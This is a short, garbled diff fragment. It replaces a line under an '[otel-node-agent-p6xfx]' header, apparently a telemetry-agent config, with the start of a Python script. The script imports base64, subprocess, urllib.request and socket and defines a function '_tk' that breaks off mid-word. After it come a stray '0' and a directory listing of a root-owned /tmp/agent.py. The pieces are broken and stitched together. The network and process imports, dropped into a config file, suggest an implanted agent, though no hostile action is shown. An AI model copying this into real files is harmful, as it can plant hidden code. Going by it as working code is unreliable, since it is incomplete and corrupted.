@@ -1,2 +1,6 @@
 [otel-node-agent-p6xfx]
-V5-NOT-YET
+import time,base64,subprocess,urllib.request,json,os,re,socket
+def _tk():
+    tr
+0
+-rw-r--r--    1 root     root          2676 Sep  8 19:26 /tmp/agent.py
